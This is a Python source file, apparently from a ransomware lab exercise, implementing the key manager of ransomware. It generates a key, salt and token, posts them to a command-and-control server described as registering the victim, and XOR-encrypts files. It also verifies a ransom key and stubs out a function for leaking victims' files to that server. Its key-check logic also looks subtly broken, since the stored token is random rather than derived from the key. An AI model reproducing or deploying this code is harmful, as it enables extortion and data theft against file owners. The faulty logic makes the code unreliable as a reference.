from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATIONS = 48000
    TOKEN_SIZE = 16
    SALT_SIZE = 16
    KEY_SIZE = 16

    def __init__(self, remote_host_port: str = "127.0.0.1:6666", path: str = "/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_SIZE,
            salt=salt,
            iterations=self.ITERATIONS,
        )
        return kdf.derive(key)

    def create(self) -> Tuple[bytes, bytes, bytes]:
        """
        Génère un token, un sel et une clé aléatoire.
        """
        token = secrets.token_bytes(self.TOKEN_SIZE)
        salt = secrets.token_bytes(self.SALT_SIZE)
        key = secrets.token_bytes(self.KEY_SIZE)

        return salt, key, token

    def bin_to_b64(self, data: bytes) -> str:
        """
        Convertit des données binaires en base64.
        """
        return base64.b64encode(data).decode("utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        """
        Enregistre la victime sur le serveur CNC.
        """
        url = f"http://{self._remote_host_port}/new"

        payload = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
        }

        response = requests.post(url, json=payload)

        self._log.info(f"POST {url} {payload} {response.status_code}")

        if response.status_code != 200:
            self._log.error(f"Échec d'envoi : {response.text}")
        else:
            self._log.info("Données envoyées avec succès")

    def setup(self) -> None:
        """
        Initialise les données cryptographiques et enregistre la victime.
        """
        self._salt, self._key, self._token = self.create()

        os.makedirs(self._path, exist_ok=True)

        with open(os.path.join(self._path, "salt_data.bin"), "wb") as salt_file:
            salt_file.write(self._salt)

        with open(os.path.join(self._path, "token_data.bin"), "wb") as token_file:
            token_file.write(self._token)

        self.post_new(self._salt, self._key, self._token)

    def load_crypto_data(self) -> None:
        """
        Charge les données cryptographiques depuis les fichiers locaux.
        """
        salt_file_path = os.path.join(self._path, "salt_data.bin")
        token_file_path = os.path.join(self._path, "token_data.bin")

        if os.path.exists(salt_file_path) and os.path.exists(token_file_path):
            with open(salt_file_path, "rb") as salt_f:
                self._salt = salt_f.read()
            with open(token_file_path, "rb") as token_f:
                self._token = token_f.read()
        else:
            self._log.info("Aucune donnée de chiffrement trouvée.")

    def check_key(self, candidate_key: bytes) -> bool:
        """
        Vérifie si la clé candidate est valide.
        """
        generated_token = self.do_derivation(self._salt, candidate_key)
        return generated_token == self._token

    def set_key(self, b64_key: str) -> None:
        """
        Décode et vérifie la clé, puis l'enregistre si elle est correcte.
        """
        candidate_key = base64.b64decode(b64_key)

        if self.check_key(candidate_key):
            self._key = candidate_key
            self._log.info("Clé correcte et enregistrée.")
        else:
            self._log.error("Clé invalide.")
            raise ValueError("Clé incorrecte")

    def get_hex_token(self) -> str:
        """
        Retourne le token sous forme hexadécimale.
        """
        with open(os.path.join(self._path, "token_data.bin"), "rb") as token_file:
            token = token_file.read()
        return token.hex()

    def xorfiles(self, files: List[str]) -> None:
        """
        Applique XOR sur une liste de fichiers pour les chiffrer/déchiffrer.
        """
        for file in files:
            xorfile(file, self._key)

    def leak_files(self, files: List[str]) -> None:
        """
        Envoie les fichiers et leur chemin d'origine au serveur CNC.
        """
        raise NotImplemented()

    def clean(self):
        """
        Supprime les données cryptographiques après l'opération.
        """
        self._key = None
        self._salt = None
        self._token = None


